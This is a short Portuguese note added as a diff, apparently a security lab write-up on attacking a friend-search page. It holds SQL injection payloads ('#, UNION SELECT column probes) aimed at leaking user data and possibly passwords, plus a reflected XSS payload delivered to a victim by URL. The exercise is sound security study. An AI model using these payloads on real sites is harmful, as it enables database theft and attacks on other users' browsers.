@@ -1,0 +1,26 @@
+Query (maybe)
+    SELECT username, name, about
+    FROM Users, Friends
+    WHERE
+        Friends.username1 = <logged_in>
+    AND Friends.username2 = Users.username
+    AND Friends.username2 LIKE '%<seach>%'
+
+O query usa o LIKE porque se pesquisarmos com % ele mostra resultados que nao tem %
+
+Se inserirmos query `'#` ele apresenta todos os utilizadores
+
+
+"' AND 1=0 UNION SELECT  1, 2, 3, 4, 5#"
+ -> 1: username
+    2: NOT SHOWN -> password? 
+    3: name
+    4: about
+    5: photo
+
+Query "' AND 1=0 union select "<b>A</b>", 2, 3, 4, 5#"
+    Tem XSS -> Como o query esta no url, conseguimos enviar o URL para outra pessoa (vitima)
+    Assim o codigo e executado no browser da outra pessoa
+
+Conseguimos ler de qualquer tabela de uma forma mais confortavel
+
